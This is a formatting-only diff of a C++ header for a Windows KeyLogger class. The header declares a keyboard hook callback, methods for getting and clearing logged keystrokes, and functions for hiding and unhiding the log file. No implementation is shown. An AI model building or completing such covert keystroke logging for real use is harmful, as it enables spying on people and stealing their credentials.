@@ -7,9 +7,10 @@
 #include <unordered_map>
 #include <sstream>
 
-class KeyLogger {
+class KeyLogger
+{
 public:
-    explicit KeyLogger(const std::string& filename);
+    explicit KeyLogger(const std::string &filename);
     ~KeyLogger();
 
     void start();
@@ -17,8 +18,8 @@ public:
     std::string getLoggedData();
     void clearLogFile();
 
-    static void hideFile(const std::string& filename);
-    static void unhideFile(const std::string& filename);
+    static void hideFile(const std::string &filename);
+    static void unhideFile(const std::string &filename);
 
 private:
     static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -30,7 +31,7 @@ private:
     bool running;
     DWORD threadId;
 
-    static KeyLogger* s_instance;
+    static KeyLogger *s_instance;
 };
 
 #endif // KEYLOGGER_HPP
